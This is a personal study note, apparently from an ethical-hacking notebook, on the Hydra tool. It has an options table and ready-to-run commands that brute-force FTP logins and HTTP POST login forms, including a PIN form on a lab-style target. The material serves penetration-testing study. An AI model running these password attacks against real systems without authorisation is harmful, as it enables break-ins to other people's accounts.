---
{"dg-publish":true,"permalink":"/notes/hydra/"}
---

- Crack pass with pass dic
- Supports FTP, POP3, IMAP, SMTP, SSH, and all methods related to HTTP.

| Option                                                       | Description                                                   |
| ------------------------------------------------------------ | ------------------------------------------------------------- |
| `hydra -l username -P wordlist.txt server service`           | General command-line                                          |
| `hydra -l mark -P /usr/share/wordlists/rockyou.txt IP ftp`   | E.g. ftp                                                      |
| `hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://IP` | E.g. ftp                                                      |
| `server`                                                     | hostname or IP address of the target server.                  |
| `service`                                                    | service which are trying to <br>launch the dictionary attack. |
| `-l`                                                         | specifies the (SSH) **username** for login                    |
| `-P`                                                         | indicates a **list of passwords**                             |
| `-t 4`                                                       | sets the number of **threads** to spawn                       |
| `-s`                                                         | **port** number                                               |
| `-V`                                                         | Verbose for every attempt                                     |
| `-vV`                                                        | very verbose<br>shows login+pass for each attempt             |
| `-d`                                                         | Debugging                                                     |
| `-L`                                                         | indicates a **list of users**                                 |
| `-p`                                                         | specifies the (SSH) **password** for login                    |
| `-f`                                                         | stops Hydra after finding a working password                  |
| `http-post-form`                                             | the type of the form is POST                                  |
| `<path>`                                                     | the login page URL, for example, `login.php`                  |
| `<invalid_response>`                                         | part of the response when the login fails                     |
## Post Web Form
- Brute force web forms attack.
- You must know which type of request it is making; GET or POST methods are commonly used.
- You can use your browser’s network tab (in developer tools) to see the request types or view the source code.
```shell
sudo hydra <username> <wordlist> 10.10.181.239 http-post-form "<path>:<login_credentials>:invalid_response>"
```

### POST login form:
```shell
hydra -l <username> -P <wordlist> 10.10.181.239 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- The login page is only `/`, i.e., the main IP address.
- The `username` is the form field where the username is entered
- The specified username(s) will replace `^USER^`
- The `password` is the form field where the password is entered
- The provided passwords will be replacing `^PASS^`
- Finally, `F=incorrect` is a string that appears in the server reply when the login fails
---
![Pasted image 20231206174317.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020231206174317.png)
```sh
hydra -l '' -P 3digits.txt -f -v 10.10.180.149 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

The command above will try one password after another in the `3digits.txt` file. It specifies the following:

- `-l ''` indicates that the login name is blank as the security lock only requires a password
- `-P 3digits.txt` specifies the password file to use
- `-f` stops Hydra after finding a working password
- `-v` provides verbose output and is helpful for catching errors
- `10.10.180.149` is the IP address of the target
- `http-post-form` specifies the HTTP method to use
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
    - `/login.php` is the page where the PIN code is submitted
    - `pin=^PASS^` will replace `^PASS^` with values from the password list
    - `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”
- `-s 8000` indicates the port number on the target